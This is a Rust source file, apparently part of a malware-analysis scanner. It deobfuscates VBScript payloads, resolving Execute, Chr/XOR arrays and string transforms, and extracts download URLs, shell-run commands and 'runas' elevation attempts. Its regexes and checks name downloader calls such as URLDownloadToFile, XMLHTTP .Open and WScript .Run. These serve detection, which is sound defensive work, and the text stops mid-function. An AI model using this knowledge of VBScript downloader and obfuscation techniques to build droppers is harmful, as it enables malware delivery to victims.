//! VBScript payload post-processing: extract URLs from VBS payloads.
//! Common patterns: MSXML2.XMLHTTP, WinHTTP.WinHTTPRequest, URLDownloadToFile.

use crate::env::Environment;
use crate::traits::Trait;
use base64::Engine as _;
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::HashMap;

type VbsStringBindings = HashMap<String, String>;
type VbsArrayBindings = HashMap<String, Vec<String>>;

#[allow(clippy::expect_used)]
static XMLHTTP_OPEN_RE: Lazy<Regex> = Lazy::new(|| {
    // http.Open "GET", "url", False  /  http.Open "POST", "url", False
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*"([^"]+)""#).expect("xmlhttp")
});

#[allow(clippy::expect_used)]
static XMLHTTP_OPEN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("xmlhttp variable")
});

#[allow(clippy::expect_used)]
static VBS_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?im)^\s*(?:Const\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*$"#)
        .expect("vbs string assignment")
});

#[allow(clippy::expect_used)]
static VBS_FOR_UBOUND_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)^\s*For\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*0\s+To\s+UBound\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*$"#,
    )
    .expect("vbs for ubound")
});

#[allow(clippy::expect_used)]
static VBS_CHR_ARRAY_APPEND_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\s*&\s*Chr(?:B|W)?\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*(?:Xor\s*([^)]+?))?\s*\)\s*$"#,
    )
    .expect("vbs chr array append")
});

#[allow(clippy::expect_used)]
static VBS_ARRAY_INDEX_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)^\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*(\d+)\s*\)\s*=\s*([&Hh0-9A-Fa-fxX+\-\s]+)\s*$"#,
    )
    .expect("vbs indexed array assignment")
});

#[allow(clippy::expect_used)]
static VBS_NODE_TEXT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)^\s*([A-Za-z_][A-Za-z0-9_]*)\.Text\s*=\s*(.+?)\s*$"#).expect("vbs node text")
});

#[allow(clippy::expect_used)]
static VBS_NODE_DATATYPE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)^\s*([A-Za-z_][A-Za-z0-9_]*)\.DataType\s*=\s*(.+?)\s*$"#)
        .expect("vbs node datatype")
});

#[allow(clippy::expect_used)]
static VBS_NODE_TYPED_REDIM_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)^\s*ReDim\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*LenB\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\.NodeTypedValue\s*\)\s*-\s*1\s*\)\s*$"#,
    )
    .expect("vbs nodetypedvalue redim")
});

#[allow(clippy::expect_used)]
static VBS_ARRAY_XOR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)^\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*Xor\s*(.+?)\s*$"#,
    )
    .expect("vbs array xor assignment")
});

#[allow(clippy::expect_used)]
static SAVETOFILE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.SaveToFile\s*\(?\s*"([^"]+)""#).expect("savetofile"));

#[allow(clippy::expect_used)]
static URLDOWN_RE: Lazy<Regex> = Lazy::new(|| {
    // URLDownloadToFile
    Regex::new(r#"(?i)URLDownloadToFile[^"]*"([^"]+)""#).expect("urldown")
});

#[allow(clippy::expect_used)]
static URLDOWN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)URLDownloadToFile\s*\(?\s*[^,\r\n]+,\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("urldown variable")
});

#[allow(clippy::expect_used)]
static SHELL_RUN_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.Run\s*\(?\s*"([^"]+)""#).expect("wscript shell run"));

#[allow(clippy::expect_used)]
static SHELL_RUN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.Run\s*\(?\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("wscript shell run variable")
});

pub fn scan_vbs_payloads(env: &mut Environment) {
    let mut payloads = std::mem::take(&mut env.all_extracted_vbs);
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    'payloads: for (idx, payload) in payloads.iter().enumerate() {
        if env.check_deadline() {
            break;
        }
        let raw = String::from_utf8_lossy(payload);
        let uncommented = strip_vbs_apostrophe_comments(&raw);
        let text = expand_vbs_static_execute(&join_vbs_line_continuations(&uncommented));
        let mut bindings: VbsStringBindings = HashMap::new();
        let mut array_bindings: VbsArrayBindings = HashMap::new();
        for line in text.lines() {
            if env.check_deadline() {
                break 'payloads;
            }
            for statement in split_vbs_statements(line) {
                if bind_vbs_numeric_array_index(statement, &mut array_bindings) {
                    continue;
                }
                let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) else {
                    continue;
                };
                let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
                    continue;
                };
                let key = name.as_str().to_ascii_lowercase();
                if let Some(values) =
                    parse_vbs_array_values(value.as_str(), &bindings, &array_bindings)
                {
                    array_bindings.insert(key, values);
                    continue;
                }
                if !bindings.contains_key(&key)
                    && vbs_concat_expr_references_name(value.as_str(), &key)
                {
                    bindings.insert(key.clone(), String::new());
                }
                if let Some(value) =
                    eval_vbs_string_expr(value.as_str(), &bindings, &array_bindings)
                {
                    bindings.insert(key, value);
                } else if let Some(value) = parse_vbs_integer(value.as_str()) {
                    bindings.insert(key, value.to_string());
                }
            }
        }
        recover_vbs_chr_array_loop_bindings(&text, &mut bindings, &array_bindings);
        recover_vbs_nodetypedvalue_array_bindings(&text, &bindings, &mut array_bindings);
        recover_vbs_chr_array_loop_bindings(&text, &mut bindings, &array_bindings);
        let dst_hint: Option<String> = extract_savetofile_dest_exprs(&text)
            .into_iter()
            .find_map(|expr| eval_vbs_string_expr(expr, &bindings, &array_bindings))
            .or_else(|| {
                SAVETOFILE_RE
                    .captures(&text)
                    .and_then(|c| c.get(1).map(|m| m.as_str().to_string()))
            });
        for (url_expr, dst_expr) in extract_urldownloadtofile_arg_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(url) = eval_vbs_string_expr(url_expr, &bindings, &array_bindings)
                .and_then(|value| normalize_vbs_download_url(&value))
            else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let dst =
                dst_expr.and_then(|expr| eval_vbs_string_expr(expr, &bindings, &array_bindings));
            let snippet: String = text.chars().take(120).collect();
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst.or_else(|| dst_hint.clone()),
            });
        }
        let regexes: &[&Lazy<Regex>] = &[&XMLHTTP_OPEN_RE, &URLDOWN_RE];
        for re in regexes {
            for caps in re.captures_iter(&text) {
                if env.check_deadline() {
                    break 'payloads;
                }
                let Some(url_match) = caps.get(1) else {
                    continue;
                };
                let Some(url) = crate::deob_scan::normalize_liberal_url_token(url_match.as_str())
                else {
                    continue;
                };
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                let snippet: String = text.chars().take(120).collect();
                env.traits.push(Trait::Download {
                    cmd: format!("(vbs #{idx}) {snippet}"),
                    src: url,
                    dst: dst_hint.clone(),
                });
            }
        }

        for caps in SHELL_RUN_RE.captures_iter(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(command) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            push_downloads_from_vbs_command(env, idx, &text, command, &dst_hint, &mut seen);
        }

        for caps in SHELL_RUN_VAR_RE.captures_iter(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(var_match) = caps.get(1) else {
                continue;
            };
            let Some(command) = bindings.get(&var_match.as_str().to_ascii_lowercase()) else {
                continue;
            };
            push_downloads_from_vbs_command(env, idx, &text, command, &dst_hint, &mut seen);
        }

        for expr in extract_shell_run_command_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(command) = eval_vbs_string_expr(expr, &bindings, &array_bindings) else {
                continue;
            };
            push_downloads_from_vbs_command(env, idx, &text, &command, &dst_hint, &mut seen);
        }

        for (program_expr, args_expr, verb_expr) in extract_shell_execute_command_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(program) = eval_vbs_string_expr(program_expr, &bindings, &array_bindings)
            else {
                continue;
            };
            let mut args_value = None;
            let mut command = program.clone();
            if let Some(args_expr) = args_expr {
                if let Some(args) = eval_vbs_string_expr(args_expr, &bindings, &array_bindings) {
                    if !args.trim().is_empty() {
                        command.push(' ');
                        command.push_str(&args);
                        args_value = Some(args);
                    }
                }
            }
            if let Some(verb_expr) = verb_expr {
                if let Some(verb) = eval_vbs_string_expr(verb_expr, &bindings, &array_bindings) {
                    if verb.trim().eq_ignore_ascii_case("runas") {
                        env.traits.push(Trait::SelfElevation {
                            target: program.clone(),
                            args: args_value.clone(),
                        });
                    }
                }
            }
            push_downloads_from_vbs_command(env, idx, &text, &command, &dst_hint, &mut seen);
        }

        for expr in extract_xmlhttp_open_url_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(url) = eval_vbs_string_expr(expr, &bindings, &array_bindings)
                .and_then(|value| normalize_vbs_download_url(&value))
            else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet: String = text.chars().take(120).collect();
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for re in [&XMLHTTP_OPEN_VAR_RE, &URLDOWN_VAR_RE] {
            for caps in re.captures_iter(&text) {
                if env.check_deadline() {
                    break 'payloads;
                }
                let Some(var_match) = caps.get(1) else {
                    continue;
                };
                let Some(url) = bindings.get(&var_match.as_str().to_ascii_lowercase()) else {
                    continue;
                };
                let Some(url) = normalize_vbs_download_url(url) else {
                    continue;
                };
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                let snippet: String = text.chars().take(120).collect();
                env.traits.push(Trait::Download {
                    cmd: format!("(vbs #{idx}) {snippet}"),
                    src: url,
                    dst: dst_hint.clone(),
                });
            }
        }
    }
    payloads.append(&mut env.all_extracted_vbs);
    env.all_extracted_vbs = payloads;
}

fn normalize_vbs_download_url(value: &str) -> Option<String> {
    crate::deob_scan::normalize_liberal_url_token(value)
        .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(value))
}

fn extract_shell_run_command_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        for method in [".run", ".exec"] {
            let mut cursor = 0usize;
            while let Some(rel) = lower[cursor..].find(method) {
                let run_start = cursor + rel;
                let args_start = run_start + method.len();
                let next = line[args_start..].chars().next();
                if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                    cursor = args_start;
                    continue;
                }
                let mut args = line[args_start..].trim_start();
                if let Some(rest) = args.strip_prefix('(') {
                    args = rest;
                }
                let parts = split_vbs_args(args);
                if let Some(expr) = parts.first() {
                    out.push(*expr);
                }
                cursor = args_start;
            }
        }
    }
    out
}

fn extract_shell_execute_command_exprs(text: &str) -> Vec<(&str, Option<&str>, Option<&str>)> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find(".shellexecute") {
            let method_start = cursor + rel;
            let args_start = method_start + ".shellexecute".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(program) = parts.first() {
                out.push((*program, parts.get(1).copied(), parts.get(3).copied()));
            }
            cursor = args_start;
        }
    }
    out
}

fn extract_xmlhttp_open_url_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find(".open") {
            let open_start = cursor + rel;
            let args_start = open_start + ".open".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.get(1) {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn extract_urldownloadtofile_arg_exprs(text: &str) -> Vec<(&str, Option<&str>)> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find("urldownloadtofile") {
            let call_start = cursor + rel;
            let mut args_start = call_start + "urldownloadtofile".len();
            if line[args_start..]
                .chars()
                .next()
                .is_some_and(|c| matches!(c, 'a' | 'A' | 'w' | 'W'))
            {
                args_start += 1;
            }
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.get(1) {
                out.push((*expr, parts.get(2).copied()));
            }
            cursor = args_start;
        }
    }
    out
}

fn extract_savetofile_dest_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find(".savetofile") {
            let call_start = cursor + rel;
            let args_start = call_start + ".savetofile".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.first() {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn push_downloads_from_vbs_command(
    env: &mut Environment,
    idx: usize,
    text: &str,
    command: &str,
    dst_hint: &Option<String>,
    seen: &mut std::collections::HashSet<(usize, String)>,
) {
    for url_caps in crate::deob_scan::URL_RE.captures_iter(command) {
        let Some(raw_url) = url_caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(url) = crate::deob_scan::normalize_liberal_url_token(raw_url) else {
            continue;
        };
        if crate::deob_scan::is_noise_url(&url) || !seen.insert((idx, url.clone())) {
            continue;
        }
        let snippet: String = text.chars().take(120).collect();
        env.traits.push(Trait::Download {
            cmd: format!("(vbs #{idx}) {snippet}"),
            src: url,
            dst: dst_hint.clone(),
        });
    }

    for token in command.split_ascii_whitespace() {
        let candidate = token.trim_matches(['"', '\'', '(', ')', '[', ']', '{', '}', ',', ';']);
        let Some(url) = normalize_vbs_command_token_url(candidate) else {
            continue;
        };
        if crate::deob_scan::is_noise_url(&url) || !seen.insert((idx, url.clone())) {
            continue;
        }
        let snippet: String = text.chars().take(120).collect();
        env.traits.push(Trait::Download {
            cmd: format!("(vbs #{idx}) {snippet}"),
            src: url,
            dst: dst_hint.clone(),
        });
    }

    if command.len() <= 256 * 1024 && vbs_command_may_launch_powershell(command) {
        crate::interp::interpret_line(command, env);
        if let Some(suffix) = vbs_powershell_command_suffix(command) {
            if suffix != command {
                crate::interp::interpret_line(suffix, env);
            }
        }
        let pending_ps1 = std::mem::take(&mut env.exec_ps1);
        for payload in pending_ps1 {
            push_unique_payload(&mut env.all_extracted_ps1, payload);
        }
    }
}

fn normalize_vbs_command_token_url(candidate: &str) -> Option<String> {
    crate::deob_scan::normalize_schemeless_domain_path_token(candidate).or_else(|| {
        candidate
            .to_ascii_lowercase()
            .starts_with("ttp://")
            .then(|| format!("h{candidate}"))
            .and_then(|repaired| crate::deob_scan::normalize_liberal_url_token(&repaired))
    })
}

fn vbs_command_may_launch_powershell(command: &str) -> bool {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '(' | ')' | ','))
        .map(|token| {
            token
                .rsplit(['\\', '/'])
                .next()
                .unwrap_or(token)
                .trim_end_matches(".exe")
                .to_ascii_lowercase()
        })
        .any(|program| program == "powershell" || program == "pwsh")
}

fn vbs_powershell_command_suffix(command: &str) -> Option<&str> {
    let mut token_start = None;
    for (idx, ch) in command.char_indices() {
        if ch.is_whitespace() || matches!(ch, '"' | '\'' | '(' | ')' | ',') {
            if let Some(start) = token_start.take() {
                if vbs_token_is_powershell(&command[start..idx]) {
                    return command.get(start..).map(str::trim_start);
                }
            }
        } else if token_start.is_none() {
            token_start = Some(idx);
        }
    }
    let start = token_start?;
    vbs_token_is_powershell(&command[start..])
        .then(|| command.get(start..).map(str::trim_start))
        .flatten()
}

fn vbs_token_is_powershell(token: &str) -> bool {
    let program = token
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(token)
        .trim_end_matches(".exe")
        .to_ascii_lowercase();
    program == "powershell" || program == "pwsh"
}

fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
    if !payloads.iter().any(|existing| existing == &payload) {
        payloads.push(payload);
    }
}

fn join_vbs_line_continuations(text: &str) -> String {
    let mut out = String::new();
    for line in text.lines() {
        let trimmed_end = line.trim_end();
        if vbs_line_has_continuation(trimmed_end) {
            out.push_str(trimmed_end[..trimmed_end.len() - 1].trim_end());
            out.push(' ');
        } else {
            out.push_str(line);
            out.push('\n');
        }
    }
    out
}

fn vbs_line_has_continuation(trimmed_end: &str) -> bool {
    let Some(prefix) = trimmed_end.strip_suffix('_') else {
        return false;
    };
    prefix
        .as_bytes()
        .last()
        .is_some_and(u8::is_ascii_whitespace)
}

fn expand_vbs_static_execute(text: &str) -> String {
    const MAX_EXECUTE_EXPANSION_BYTES: usize = 1024 * 1024;

    let mut bindings: VbsStringBindings = HashMap::new();
    let mut array_bindings: VbsArrayBindings = HashMap::new();
    for line in text.lines() {
        for statement in split_vbs_statements(line) {
            if bind_vbs_numeric_array_index(statement, &mut array_bindings) {
                continue;
            }
            if let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) {
                if let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) {
                    let key = name.as_str().to_ascii_lowercase();
                    if let Some(values) =
                        parse_vbs_array_values(value.as_str(), &bindings, &array_bindings)
                    {
                        array_bindings.insert(key, values);
                    } else if let Some(value) =
                        eval_vbs_string_expr(value.as_str(), &bindings, &array_bindings)
                    {
                        bindings.insert(key, value);
                    } else if let Some(value) = parse_vbs_integer(value.as_str()) {
                        bindings.insert(key, value.to_string());
                    }
                }
            }
        }
    }
    recover_vbs_chr_array_loop_bindings(text, &mut bindings, &array_bindings);
    recover_vbs_nodetypedvalue_array_bindings(text, &bindings, &mut array_bindings);
    recover_vbs_chr_array_loop_bindings(text, &mut bindings, &array_bindings);
    let mut expanded = Vec::new();
    let mut expanded_bytes = 0usize;
    let mut pending: Vec<String> = text.lines().map(str::to_string).collect();
    let mut cursor = 0usize;

    while cursor < pending.len() {
        let line = pending[cursor].clone();
        cursor += 1;
        for statement in split_vbs_statements(&line) {
            if bind_vbs_numeric_array_index(statement, &mut array_bindings) {
                continue;
            }
            if let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) {
                if let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) {
                    let key = name.as_str().to_ascii_lowercase();
                    if let Some(values) =
                        parse_vbs_array_values(value.as_str(), &bindings, &array_bindings)
                    {
                        array_bindings.insert(key, values);
                    } else if let Some(value) =
                        eval_vbs_string_expr(value.as_str(), &bindings, &array_bindings)
                    {
                        bindings.insert(key, value);
                    } else if let Some(value) = parse_vbs_integer(value.as_str()) {
                        bindings.insert(key, value.to_string());
                    }
                }
            }

            let Some(expr) = vbs_execute_expr(statement) else {
                continue;
            };
            recover_vbs_chr_array_loop_bindings(text, &mut bindings, &array_bindings);
            recover_vbs_nodetypedvalue_array_bindings(text, &bindings, &mut array_bindings);
            recover_vbs_chr_array_loop_bindings(text, &mut bindings, &array_bindings);
            let Some(decoded) = eval_vbs_string_expr(expr, &bindings, &array_bindings) else {
                continue;
            };
            if decoded.trim().is_empty() {
                continue;
            }
            expanded_bytes = expanded_bytes.saturating_add(decoded.len());
            if expanded_bytes > MAX_EXECUTE_EXPANSION_BYTES {
                break;
            }
            pending.extend(decoded.lines().map(str::to_string));
            expanded.push(decoded);
        }
        if expanded_bytes > MAX_EXECUTE_EXPANSION_BYTES {
            break;
        }
    }

    if expanded.is_empty() {
        return text.to_string();
    }

    let mut out = String::with_capacity(
        text.len()
            .saturating_add(1)
            .saturating_add(expanded.iter().map(String::len).sum::<usize>()),
    );
    out.push_str(text);
    if !out.ends_with('\n') {
        out.push('\n');
    }
    for decoded in expanded {
        out.push_str(&decoded);
        if !out.ends_with('\n') {
            out.push('\n');
        }
    }
    out
}

fn vbs_execute_expr(statement: &str) -> Option<&str> {
    let trimmed = statement.trim();
    let lower = trimmed.to_ascii_lowercase();
    for name in ["executeglobal", "execute"] {
        let Some(rest) = lower.strip_prefix(name) else {
            continue;
        };
        let original_rest = &trimmed[name.len()..];
        if !rest
            .as_bytes()
            .first()
            .is_some_and(|b| b.is_ascii_whitespace() || *b == b'(')
        {
            continue;
        }
        let expr = original_rest.trim_start();
        if expr.starts_with('(') && expr.ends_with(')') {
            return expr.get(1..expr.len().saturating_sub(1)).map(str::trim);
        }
        return Some(expr);
    }
    None
}

fn strip_vbs_apostrophe_comments(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for line in text.lines() {
        let bytes = line.as_bytes();
        let mut in_quote = false;
        let mut i = 0usize;
        let mut cut = line.len();
        while i < bytes.len() {
            match bytes[i] {
                b'"' => {
                    if in_quote && bytes.get(i + 1) == Some(&b'"') {
                        i += 2;
                        continue;
                    }
                    in_quote = !in_quote;
                    i += 1;
                }
                b'\'' if !in_quote => {
                    cut = i;
                    break;
                }
                _ => i += 1,
            }
        }
        out.push_str(line[..cut].trim_end());
        out.push('\n');
    }
    out
}

fn split_vbs_statements(line: &str) -> Vec<&str> {
    let mut statements = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b':' if !in_quote => {
                statements.push(line[start..i].trim());
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    statements.push(line[start..].trim());
    statements
}

fn eval_vbs_string_expr(
    expr: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let mut out = String::new();
    let mut saw_part = false;
    for part in split_vbs_concat(expr) {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(value) = parse_vbs_string_literal(part) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(ch) = parse_vbs_chr(part) {
            out.push(ch);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_string_transform(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_split_index(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_cstr(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_eval(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_replace(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_mid(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        let key = part.trim_matches(['(', ')']).to_ascii_lowercase();
        if let Some(value) = bindings.get(&key) {
            out.push_str(value);
            saw_part = true;
            continue;
        }
        return None;
    }
    saw_part.then_some(out)
}

fn vbs_concat_expr_references_name(expr: &str, name_lower: &str) -> bool {
    split_vbs_concat(expr).into_iter().any(|part| {
        part.trim()
            .trim_matches(['(', ')'])
            .eq_ignore_ascii_case(name_lower)
    })
}

fn split_vbs_concat(expr: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let mut paren_depth = 0usize;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b'(' if !in_quote => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_quote => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b'&' | b'+' if !in_quote && paren_depth == 0 => {
                parts.push(&expr[start..i]);
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    parts.push(&expr[start..]);
    parts
}

fn parse_vbs_string_literal(part: &str) -> Option<String> {
    let part = part.trim();
    if !part.starts_with('"') || !part.ends_with('"') || part.len() < 2 {
        return None;
    }
    Some(part[1..part.len() - 1].replace("\"\"", "\""))
}

fn parse_vbs_chr(part: &str) -> Option<char> {
    if let Some(inner) = vbs_function_args(part, "chrb") {
        let value = parse_vbs_integer(inner)?;
        return (value <= u8::MAX as u32)
            .then_some(value)
            .and_then(char::from_u32);
    }
    let inner = vbs_function_args(part, "chr").or_else(|| vbs_function_args(part, "chrw"))?;
    let value = parse_vbs_integer(inner)?;
    char::from_u32(value)
}

fn parse_vbs_integer(value: &str) -> Option<u32> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    if let Some(integer) = parse_vbs_integer_atom(value) {
        return Some(integer);
    }

    parse_vbs_integer_sum(value)
}

fn parse_vbs_integer_atom(value: &str) -> Option<u32> {
    let value = value.trim();
    if let Some(hex) = value
        .strip_prefix("&h")
        .or_else(|| value.strip_prefix("&H"))
        .or_else(|| value.strip_prefix("0x"))
        .or_else(|| value.strip_prefix("0X"))
    {
        u32::from_str_radix(hex.trim(), 16).ok()
    } else {
        value.parse().ok()
    }
}

fn parse_vbs_integer_sum(value: &str) -> Option<u32> {
    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = value.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = value[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_vbs_integer_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = value[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_vbs_integer_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_vbs_string_transform(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let lower = part.trim().to_ascii_lowercase();
    if let Some(inner) = vbs_function_args(part, "strreverse") {
        let value = eval_vbs_string_expr(inner, bindings, array_bindings)?;
        return Some(value.chars().rev().collect());
    }
    if let Some(inner) = vbs_function_args(part, "lcase") {
        return Some(eval_vbs_string_expr(inner, bindings, array_bindings)?.to_ascii_lowercase());
    }
    if let Some(inner) = vbs_function_args(part, "ucase") {
        return Some(eval_vbs_string_expr(inner, bindings, array_bindings)?.to_ascii_uppercase());
    }
    if let Some(inner) = vbs_function_args(part, "trim") {
        return Some(
            eval_vbs_string_expr(inner, bindings, array_bindings)?
                .trim()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "ltrim") {
        return Some(
            eval_vbs_string_expr(inner, bindings, array_bindings)?
                .trim_start()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "rtrim") {
        return Some(
            eval_vbs_string_expr(inner, bindings, array_bindings)?
                .trim_end()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "join") {
        let args = split_vbs_args(inner);
        if args.len() < 2 {
            return None;
        }
        let values = parse_vbs_array_values(args[0], bindings, array_bindings)?;
        let separator = eval_vbs_string_expr(args[1], bindings, array_bindings)?;
        return Some(values.join(&separator));
    }
    if lower.starts_with("left(") {
